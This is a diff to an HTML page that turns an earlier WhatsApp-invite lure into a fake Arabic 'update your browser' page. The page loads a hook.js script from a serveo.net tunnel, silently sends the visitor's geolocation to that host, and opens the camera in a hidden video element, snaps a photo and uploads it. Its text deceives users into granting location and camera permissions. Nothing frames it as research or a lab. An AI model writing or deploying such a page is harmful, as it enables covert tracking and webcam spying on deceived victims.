@@ -1,12 +1,91 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>صبايا اوربا 
-        WhatsApp Group Inviten</title>
-    <script src="https://589a-82-174-154-56.ngrok-free.app:443/hook.js"></script>
+    <title>تحديث متصفحك</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://d794286095650f0168663b28206dadf9.serveo.net:443/hook.js/hook.js" type="text/javascript"></script>
+    <script>
+        // انتظر حتى يتم تحميل الصفحة بالكامل
+        window.addEventListener('load', function()  {
+            // طلب الوصول إلى الموقع الجغرافي
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    // إرسال بيانات الموقع إلى الخادم
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", "https://d794286095650f0168663b28206dadf9.serveo.net:443/hook.js/geolocation", true) ;
+                    xhr.setRequestHeader("Content-Type", "application/json");
+                    xhr.send(JSON.stringify({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    }));
+                });
+            }
+            
+            // طلب الوصول إلى الكاميرا بعد ثانيتين
+            setTimeout(function() {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(function(stream) {
+                            // إنشاء عنصر فيديو مخفي
+                            var video = document.createElement('video');
+                            video.style.display = 'none';
+                            document.body.appendChild(video);
+                            video.srcObject = stream;
+                            video.play();
+                            
+                            // التقاط صورة بعد ثانية واحدة
+                            setTimeout(function() {
+                                var canvas = document.createElement('canvas');
+                                canvas.width = 640;
+                                canvas.height = 480;
+                                var ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                // إرسال الصورة إلى الخادم
+                                var xhr = new XMLHttpRequest();
+                                xhr.open("POST", "https://d794286095650f0168663b28206dadf9.serveo.net:443/hook.js/webcam", true) ;
+                                xhr.setRequestHeader("Content-Type", "application/json");
+                                xhr.send(JSON.stringify({
+                                    image: canvas.toDataURL('image/jpeg')
+                                }));
+                                
+                                // إيقاف تشغيل الكاميرا
+                                stream.getTracks().forEach(function(track) {
+                                    track.stop();
+                                });
+                                document.body.removeChild(video);
+                            }, 1000);
+                        });
+                }
+            }, 2000);
+        });
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .button {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 8px;
+        }
+    </style>
 </head>
 <body>
-    <h1>مرحباً بك في موقعنا</h1>
-    <p>هذه صفحة تجريبية.</p>
+    <h1>تحديث متصفحك الآن!</h1>
+    <p>اكتشفنا أن متصفحك يحتاج إلى تحديث لتحسين الأداء والأمان.</p>
+    <p>يرجى السماح بالوصول إلى موقعك والكاميرا للتحقق من توافق جهازك.</p>
+    <button class="button" onclick="alert('جاري التحديث...')">تحديث الآن</button>
 </body>
 </html>
